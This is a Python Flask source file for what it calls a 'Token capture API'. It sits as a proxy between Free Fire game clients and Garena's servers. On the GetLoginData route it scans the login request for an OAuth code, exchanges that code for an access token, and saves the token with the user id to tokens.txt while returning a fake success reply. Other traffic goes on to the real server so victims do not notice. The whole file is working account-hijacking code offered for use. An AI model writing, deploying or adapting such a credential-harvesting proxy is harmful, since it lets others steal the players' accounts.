from flask import Flask, request, jsonify, Response
import requests
import os
import re
from datetime import datetime

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
TOKEN_URL = "https://auth.garena.com/oauth/token"
CLIENT_ID = "100067"
REDIRECT_URI = "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/"

active_users = []
# ─────────────────────────────────────────────────────────────────

# ─── MANUAL PROTOBUF PARSER ────────────────────────────────────
def read_varint(data, offset):
    result = 0
    shift = 0
    while True:
        b = data[offset]
        result |= (b & 0x7f) << shift
        offset += 1
        if not (b & 0x80):
            break
        shift += 7
    return result, offset

def extract_oauth_code_from_protobuf(raw_data):
    """
    Scan the protobuf for a string field that looks like an OAuth code.
    We look for a length-delimited field (wire type 2) and check the string.
    """
    offset = 0
    data_len = len(raw_data)
    while offset < data_len:
        try:
            tag, offset = read_varint(raw_data, offset)
            wire_type = tag & 0x07
            if wire_type == 2:  # length-delimited (string, bytes, nested)
                length, offset = read_varint(raw_data, offset)
                if length > 0 and offset + length <= data_len:
                    value = raw_data[offset:offset+length]
                    try:
                        s = value.decode('utf-8')
                        # Check if it looks like an OAuth code: length >= 30, alphanumeric with -_ .
                        if len(s) >= 30 and not s.isdigit() and re.match(r'^[a-zA-Z0-9_\-\.]+$', s):
                            return s
                    except UnicodeDecodeError:
                        pass
                    offset += length
                else:
                    break
            else:
                # For other wire types, skip the data
                if wire_type == 0:  # varint
                    _, offset = read_varint(raw_data, offset)
                elif wire_type == 1:  # 64-bit
                    offset += 8
                elif wire_type == 5:  # 32-bit
                    offset += 4
                else:
                    break
        except Exception as e:
            print(f"Manual protobuf parse error: {e}")
            break
    return None

# ─── EXTRACTION FUNCTION ──────────────────────────────────────
def extract_oauth_code(raw_data):
    code = None
    # 1. Manual protobuf parsing
    code = extract_oauth_code_from_protobuf(raw_data)
    if code:
        print("✅ Extracted via manual protobuf parsing")
        return code
    # 2. Regex fallback
    patterns = [
        rb'4\/[a-zA-Z0-9_\-\.]{30,60}',
        rb'EA[a-zA-Z0-9_\-]{30,60}',
        rb'[a-zA-Z0-9_\-]{30,50}'
    ]
    for pat in patterns:
        matches = re.findall(pat, raw_data)
        for m in matches:
            candidate = m.decode('utf-8', errors='ignore')
            if len(candidate) >= 30 and not candidate.isdigit():
                code = candidate
                print("✅ Extracted via regex")
                return code
    return None

def exchange_code_for_tokens(code):
    payload = {
        "grant_type": "authorization_code",
        "code": code,
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI
    }
    try:
        resp = requests.post(TOKEN_URL, data=payload, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            hex_token = data.get('access_token')
            return hex_token
        else:
            print(f"Exchange failed: {resp.status_code} - {resp.text[:200]}")
            return None
    except Exception as e:
        print(f"Exchange error: {e}")
        return None

# ─── ROUTES ─────────────────────────────────────────────────────
@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def handle_request(user_id, subpath):
    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")
        # Print hex preview for debugging
        print(f"📋 Hex preview (200): {raw_data[:200].hex()}")

        oauth_code = extract_oauth_code(raw_data)

        if oauth_code:
            print(f"🔑 OAuth code: {oauth_code[:20]}...")
            hex_token = exchange_code_for_tokens(oauth_code)
            if hex_token:
                print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                with open("tokens.txt", "a") as f:
                    f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
            else:
                print("❌ No hex token returned.")
        else:
            print("⚠️ No OAuth code found in request.")
            print(f"📋 Full hex (first 500): {raw_data[:500].hex()}")

        return jsonify({"status": "success", "message": "OK"}), 200

    # Forward other requests to Garena
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)